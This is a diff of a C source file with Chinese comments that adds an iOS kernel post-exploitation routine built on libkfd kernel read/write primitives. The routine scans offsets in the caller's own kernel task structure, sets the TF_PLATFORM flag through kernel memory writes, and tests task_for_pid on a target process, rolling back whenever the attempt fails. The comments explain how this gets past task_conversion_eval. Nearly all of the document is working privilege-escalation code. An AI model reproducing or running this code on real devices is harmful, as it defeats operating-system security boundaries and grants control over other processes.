@@ -34,6 +34,14 @@
 #include <string.h>
 #include <stddef.h>
 
+/*
+ * [M5.89] TF_PLATFORM 段直接调 task_for_pid / mach_port_deallocate。
+ * 必须显式 include <mach/mach.h> —— libkfd 只是"碰巧"带进来一部分声明，
+ * 不保证这两个可见。构建 #40 就是因为缺这个头报 undeclared identifier。
+ */
+#include <mach/mach.h>
+#include <mach/mach_port.h>
+
 /* ── libkfd 宿主支撑层（ffi: MFLibkfdKRead4 原型）────────────────── */
 #include "MFLibkfdHost.h"
 
@@ -1069,6 +1077,132 @@ int mf_clear_proc_csflags(uint64_t proc, int scan_only, char *report, size_t rep
                  scan_only ? "（dry-run，未修改内核）" : "", line);
     }
     return (scan_only || patched > 0) ? 0 : -2;
+}
+
+/* ================================================================ */
+/* 5b) TF_PLATFORM：把自己提升成「内核级 task」                        */
+/* ================================================================ */
+/*
+ * ── 为什么改这个而不是改目标进程 ──
+ *
+ * task_for_pid 有两道独立的闸（HITB 2018, Jonathan Levin
+ * 《Lend Me Your kernel_task Port》）：
+ *
+ *   闸 ①  taskgated：看**目标** proc 的 cs_flags 是否带 CS_HARD
+ *   闸 ②  task_conversion_eval：看**调用者** task 是不是内核级
+ *
+ * 原文：
+ *     iOS 11 adds task_conversion_eval in order to restrict task port access.
+ *     Tasks are allowed to resolve their own task ports, and the kernel is
+ *     allowed to resolve anyone's task port.
+ *     ... flips TF_PLATFORM in t_flags (0x3a8)
+ *
+ * 也就是说：只清目标的 CS_HARD（5 段那个做法）**过不了闸 ②**。
+ * 真正需要的是给**自己**的 task 置 TF_PLATFORM，让
+ * task_conversion_eval 把自己当成内核级调用者。
+ *
+ * ── 好处 ──
+ *   · 只改自己的 task，不碰别人的数据结构
+ *   · 只置一个位（0x400），不整体改写，最坏是没效果
+ *   · 每次尝试后立刻验证 task_for_pid，失败就恢复原值，副作用可控
+ *
+ * ── t_flags 偏移问题 ──
+ *   论文给的 0x3a8 是 iOS 11 的值，iOS 16 会变。
+ *   所以这里在 task 结构里扫一段范围，逐个"置位 → 试 task_for_pid → 失败则回滚"。
+ *   task_for_pid 是安全调用（失败只是返回错误码），所以这个试错是可行的。
+ */
+
+#define MF_TF_PLATFORM 0x00000400u
+
+/* libkfd 不保证引入 mach 的 task_for_pid 原型，显式声明 */
+extern kern_return_t task_for_pid(mach_port_t target_tport, int pid, mach_port_t *t);
+
+int mf_try_tf_platform(int pid, int apply, char *report, size_t report_len)
+{
+    if (g_kfd == NULL) {
+        if (report && report_len) snprintf(report, report_len, "KFD 未打开");
+        return -1;
+    }
+    uint64_t task = mf_get_current_task();
+    if (task == 0) {
+        if (report && report_len) {
+            snprintf(report, report_len, "拿不到 current_task（KFD 未跑完 info 阶段？）");
+        }
+        return -2;
+    }
+
+    /*
+     * dry-run：只报候选，不写。
+     * 判据：值在合理 flags 范围内（非 0、小于 0x10000）、且当前不含 TF_PLATFORM。
+     */
+    if (!apply) {
+        char line[1536];
+        size_t used = 0;
+        int cands = 0;
+        line[0] = '\0';
+        for (uint32_t off = 0x100; off < 0x800; off += 4) {
+            uint32_t v = 0;
+            if (mf_kread32(task + off, &v) != 0) continue;
+            if (v == 0 || v > 0x10000) continue;
+            cands++;
+            if (used < sizeof(line) - 64) {
+                used += snprintf(line + used, sizeof(line) - used,
+                                 "  +0x%X = 0x%08X%s\n", off, v,
+                                 (v & MF_TF_PLATFORM) ? "（已含 TF_PLATFORM）" : "");
+            }
+        }
+        if (report && report_len) {
+            snprintf(report, report_len,
+                     "TF_PLATFORM dry-run：task=0x%llx，%d 个候选（未写）\n%s",
+                     (unsigned long long)task, cands, line);
+        }
+        return 0;
+    }
+
+    /* 真正尝试：逐候选置位 → 试 task_for_pid → 失败回滚 */
+    char line[1792];
+    size_t used = 0;
+    line[0] = '\0';
+    int tried = 0;
+
+    for (uint32_t off = 0x100; off < 0x800; off += 4) {
+        uint32_t v = 0;
+        if (mf_kread32(task + off, &v) != 0) continue;
+        if (v == 0 || v > 0x10000) continue;        /* 不像 flags */
+        if (v & MF_TF_PLATFORM) continue;           /* 已经置过了，跳过 */
+
+        if (mf_kwrite32(task + off, v | MF_TF_PLATFORM) != 0) continue;
+        tried++;
+
+        mach_port_t tp = MACH_PORT_NULL;
+        kern_return_t kr = task_for_pid(mach_task_self(), pid, &tp);
+
+        if (kr == KERN_SUCCESS && tp != MACH_PORT_NULL) {
+            if (report && report_len) {
+                snprintf(report, report_len,
+                         "✓ TF_PLATFORM 命中偏移 +0x%X（0x%08X → 0x%08X），"
+                         "task_for_pid(%d) 成功 port=0x%x\n%s",
+                         off, v, v | MF_TF_PLATFORM, pid, tp, line);
+            }
+            mach_port_deallocate(mach_task_self(), tp);
+            return (int)off;      /* 正数 = 成功的偏移 */
+        }
+
+        /* 这个偏移不对，立刻回滚，别把 task 结构改乱 */
+        mf_kwrite32(task + off, v);
+
+        if (used < sizeof(line) - 80) {
+            used += snprintf(line + used, sizeof(line) - used,
+                             "  +0x%X 试过 kr=0x%x（已回滚）\n", off, kr);
+        }
+    }
+
+    if (report && report_len) {
+        snprintf(report, report_len,
+                 "✗ TF_PLATFORM 全试完（%d 个候选）仍失败，t_flags 不在 0x100..0x800\n%s",
+                 tried, line);
+    }
+    return -3;
 }
 
 /*
